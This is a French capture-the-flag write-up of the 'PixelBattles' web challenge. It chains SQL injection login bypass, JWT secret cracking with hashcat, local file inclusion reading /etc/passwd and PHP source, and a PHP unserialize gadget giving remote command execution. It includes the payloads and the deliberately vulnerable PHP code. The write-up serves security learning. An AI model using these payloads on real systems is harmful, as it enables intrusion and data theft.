---
title: PixelBattles
categories: [Purple_Pill_2024, Web]
tags: [web, SQLI,LFI,PHP_unsearialize,JWT]
image: '/assets/images/Purple_Pill_2024/logo.png'
---

## 𝄞 Introduction

![Intro](/assets/images/Purple_Pill_2024/Web/PixelBattles/intro.webp)

Ce challenge consiste à exploiter différentes vulnérabilités web pour compromettre le serveur, obtenir un accès RCE et récupérer le flag.

## 𝄞 Solution

### 1. Bypass de l'authentification

![Accueil](/assets/images/Purple_Pill_2024/Web/PixelBattles/login.webp)

La page d'accueil propose une authentification. Sans informations utilisateur, nous tentons une injection SQL pour contourner cette authentification. En injectant une simple apostrophe (`'`) dans le champ **username** la page renvoie un **écran blanc**.

![Blank](/assets/images/Purple_Pill_2024/Web/PixelBattles/blank.webp)

En essayant un couple identifiant/mot de passe aléatoire nous obtenons un message d’erreur :  
**Invalid username or password**. 

![Error](/assets/images/Purple_Pill_2024/Web/PixelBattles/invalid.webp)

Nous allons donc essayer de faire une injection SQL pour bypass l'authentification.

```bash
' OR 1 = 1-- 
```

Cette injection fonctionne et nous permet de contourner l’authentification.

![Connected](/assets/images/Purple_Pill_2024/Web/PixelBattles/connected.webp)
![User](/assets/images/Purple_Pill_2024/Web/PixelBattles/sqli2.webp)  

Nous sommes connectés en tant qu’utilisateur `|1|1th`. Cependant, l’accès à la section **Admin** est refusé avec une erreur **Access Denied**.

![Error](/assets/images/Purple_Pill_2024/Web/PixelBattles/403.webp)

Pour tenter de se connecter avec un autre utilisateur, nous modifions notre requête **SQL** en utilisant **LIMIT** :

```bash
' OR 1 LIMIT 1,2;-- 
``` 
![User](/assets/images/Purple_Pill_2024/Web/PixelBattles/sqli2.webp)

```bash
' OR 1 LIMIT 2,3;-- 
``` 
![User2](/assets/images/Purple_Pill_2024/Web/PixelBattles/sqli3.webp)

Nous trouvons l’utilisateur **Semah**, mais avec les mêmes droits que le précédent. Nous explorons donc une autre piste.

### 2. Exploitation du token JWT

En inspectant le cookie de session, nous découvrons que la technologie utilisée est le **JWT (JSON Web Token)** :

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InNlbWFoIiwicm9sZSI6InVzZXIifQ.tsiCoyPyfA_XBJnhEE8K-tf5e_4qT6wpYMnozmEfmiQ
```

En le décodant sur [jwt.io](https://jwt.io), nous découvrons le nom d'utilisateur et le rôle associé.

![JWT](/assets/images/Purple_Pill_2024/Web/PixelBattles/jwt.webp)

Nous modifions le champ "role" en **admin** et régénérons le token, mais cela ne fonctionne pas, le cookie est invalide car nous ne connaissons pas le **secret** pour signer le token.

Nous utilisons alors **hashcat** pour brute-forcer le secret du token.

```bash
hashcat -a 0 -m 16500 jwt.txt rockyou.txt
```

Après quelques minutes, nous obtenons le mot **"secret"** comme clé secrète.

![Hashcat](/assets/images/Purple_Pill_2024/Web/PixelBattles/hashcat.webp)

En régénérant le token avec **role: admin**, nous restons connectés après le rafraîchissement de la page et obtenons l'accès à l'interface **Admin**.

![Admin](/assets/images/Purple_Pill_2024/Web/PixelBattles/admin.webp)

### 3. Exploitation LFI (Local File Inclusion)

Dans la section **admin**, nous trouvons des liens vers plusieurs fichiers d’articles, et l'un d'eux, **article1.txt**, affiche le texte **test**.

![LFI](/assets/images/Purple_Pill_2024/Web/PixelBattles/lfi.webp)

Nous suspectons ici une vulnérabilité *LFI** car il y a une inclusion de fichier.

Nous testons le payload suivant pour lire le fichier **/etc/passwd** :

```bash
page=../../../../etc/passwd
```

![LFI2](/assets/images/Purple_Pill_2024/Web/PixelBattles/lfi2.webp)

![LFI3](/assets/images/Purple_Pill_2024/Web/PixelBattles/lfi3.webp)

Cela fonctionne ! 

Dans le but d’obtenir une **RCE**, nous tentons de lire les fichiers de logs pour réaliser une attaque de type **log poisoning**, mais la lecture des logs est impossible. Nous essayons alors différents **wrappers PHP**, sans succès. Une tentative d’attaque **RFI** sans succès également.


### 4. Découverte de failles RCE avec PHP Unserialize

En examinant le code source des pages PHP via le **wrapper PHP** suivant :  
**php://filter/convert.base64-encode**  

Nous trouvons des fonctionnalités potentiellement exploitables. Le code de **admin.php** contient un paramètre **theme** qui utilise la fonction `unserialize` sur une valeur en base64. La page **admin.php** fait également appel à **utils.php**

![LFI4](/assets/images/Purple_Pill_2024/Web/PixelBattles/lfi4.webp)

```PHP
<?php

ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);

require 'vendor/autoload.php';
require 'utils.php';
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

$secret_key = "secret";

REDACTED

if (isset($_GET['page'])) {
    if (strlen($_GET['page'])>100){die("String too long !");}
        $page = $_GET['page'];
        include($page);
}
if (isset($_GET['theme']))
{
    $theme = unserialize(base64_decode($_GET['theme']));
    echo $theme;
}
?>

REDACTED
```

Cette déserialisation pourrait être exploitée en injectant un objet malveillant. Nous regardons alors le contenu de **utils.php** pour mieux comprendre.

![LFI5](/assets/images/Purple_Pill_2024/Web/PixelBattles/lfi5.webp)

```PHP
<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);

class utils{
    public $command;

    public function __construct($command = '') {
        $this->command = $command;
    }

    public function __wakeup() {
        if ($this->command) {
            echo "Executing command: " . htmlspecialchars($this->command) . "<br>";
            echo "Command output: " . htmlspecialchars(shell_exec($this->command));
        }
    }
}
```

Ce code présente une vulnérabilité critique liée à l’utilisation de la fonction **unserialize** sur une entrée utilisateur encodée en **base64**. 

Le fichier **admin.php** reçoit un paramètre **theme**, le décode en **base64**, puis le **désérialise**, ce qui active les méthodes spéciales de **PHP**, comme **__wakeup**.  

Dans **utils.php**, la classe **utils** possède une méthode **__wakeup** qui exécute des commandes système via **shell_exec** si une commande est présente. Ainsi, un attaquant pourrait injecter un objet malveillant pour exécuter des commandes sur le serveur, compromettant ainsi l’application.

Avec toutes ces informations, nous pouvons maintenant créer notre payload. Pour cela, je me suis appuyé sur cet [article](https://www.vaadata.com/blog/fr/deserialisation-vulnerabilites-exploitations-et-bonnes-pratiques-securite/) qui explique ce concept de manière très claire.


Payload :

```PHP
O:5:"utils":1:{s:7:"command";s:2:"id";}
```

Encodé en **base64** :  
`Tzo1OiJ1dGlscyI6MTp7czo3OiJjb21tYW5kIjtzOjI6ImlkIjt9`

En l’utilisant, nous parvenons à exécuter des commandes sur le serveur.

![PHP](/assets/images/Purple_Pill_2024/Web/PixelBattles/php.webp)

Nous explorons ensuite le serveur et trouvons le fichier `fc778805b96312d5737aeddea59577c4.txt`. 

![PHP2](/assets/images/Purple_Pill_2024/Web/PixelBattles/php2.webp)

Pour le lire, nous utilisons un nouveau payload :

```PHP
O:5:"utils":1:{s:7:"command";s:40:"cat fc778805b96312d5737aeddea59577c4.txt";}
```

Encodé en **base64** :  
`Tzo1OiJ1dGlscyI6MTp7czo3OiJjb21tYW5kIjtzOjQwOiJjYXQgZmM3Nzg4MDViOTYzMTJkNTczN2FlZGRlYTU5NTc3YzQudHh0Ijt9`

![PHP3](/assets/images/Purple_Pill_2024/Web/PixelBattles/php3.webp)

𝄞 FLAG : `PPC24{fc778805b96312d5737aeddea59577c4}` 𝄞